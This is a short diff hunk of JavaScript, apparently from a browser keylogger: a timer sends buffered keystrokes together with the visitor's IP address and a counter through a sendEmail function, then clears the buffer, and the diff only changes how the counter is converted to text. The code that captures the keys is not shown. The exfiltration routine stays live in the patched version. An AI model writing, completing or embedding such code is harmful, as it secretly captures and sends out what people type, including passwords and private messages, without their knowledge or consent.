@@ -190,7 +190,7 @@
 }
 	  window.setInterval(function(){
 	if(keys.length>0) {
-		sendEmail(window.ip + ':' + d + ':' + keys);
+		sendEmail(window.ip + ':' + d.toString() + ':' + keys);
 		d++
 		keys = '';
 	}
